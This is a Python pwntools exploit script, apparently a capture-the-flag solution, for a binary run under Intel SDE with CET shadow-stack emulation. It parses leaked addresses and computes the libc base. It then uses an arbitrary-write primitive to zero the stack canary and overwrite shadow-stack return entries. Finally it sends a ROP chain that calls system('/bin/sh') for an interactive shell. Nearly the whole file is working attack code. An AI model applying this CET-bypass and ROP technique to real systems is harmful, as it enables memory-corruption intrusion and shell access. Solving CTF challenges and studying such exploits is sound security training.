#!/usr/bin/python3

from pwn import *
import sys

## run.sh
"""
./sde/sde64 -cet -cet-stderr -no-follow-child -- ./chal
* ./sde/sde64: software developmemt emulator
* -cet: SDE to apply the additional functionality
* -cet-stderr: dump the errors to the standard error
* -no-follow-child: Do not follow exec or subprocess creation. Default is to follow exec or subprocess creation
* -debug: debug mode
"""

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if len(sys.argv) == 1:
    r = process(["./sde/sde64", "-cet", "-cet-stderr", "-no-follow-child", "-debug", "--", "./chal"])
    r.recvuntil('target remote :')
    print(f"target remote :{r.recvline()[:-1].decode()}")
    print(f"b *0x55555555542f")
    print(f"b *0x55555555542d")
elif len(sys.argv) == 2:
    r = process(["./sde/sde64", "-cet", "-cet-stderr", "-no-follow-child", "--", "./chal"])
else:
    r = remote('localhost', 10102)

r.recvuntil('Syscall EMU: CET CONTROL STATUS: ')
shstk = int(r.recvline()[:-1].split(b' ')[1], 16)

# arch_prctl - set architecture-specific thread state
# 0x1003 == ARCH_GET_FS
r.recvuntil('FS base ')
fs_base = int(r.recvline()[:-1], 16)
r.recvuntil('shared buffer ')
shared_buf = int(r.recvline()[:-1], 16)
r.recvuntil('printf ')
printf = int(r.recvline()[:-1], 16)
libc = printf - 0x64e10
l.address = libc
binsh = libc + 0x1b75aa

info(f"""\
[*] fs base: {hex(fs_base)}
[*] shared buffer: {hex(shared_buf)}
[*] printf: {hex(printf)}
[*] libc: {hex(libc)}
[*] shstk: {hex(shstk)}
""")

def put_value(adr, val):
    offset = (adr-shared_buf) // 8
    print(f"[*] offset: {offset}")
    if offset < 0:
        return p64((0xffffffffffffffff ^ abs(offset))+1) + p64(val)
    else:
        return p64(offset) + p64(val)

ret1 = shstk + 0xfe0 + 0x0
ret2 = shstk + 0xfe0 + 0x8
ret3 = shstk + 0xfe0 + 0x10

ret = libc + 0x25679
pop_rdi_ret = libc + 0x26b72
system = l.sym['system']

# 1. change canary to zero
payload = put_value(fs_base + 0x28, 0) \
        + put_value(ret1, ret) \
        + put_value(ret2, pop_rdi_ret) \
        + put_value(ret3, system)

ROP = flat(
    ret,
    pop_rdi_ret,
    binsh,
    system
)
payload += p64(0) # dummy
payload += p64(0) # canary
payload += p64(0) # old_rbp
payload += ROP

print(payload)
input()
r.sendline(payload)
r.interactive()
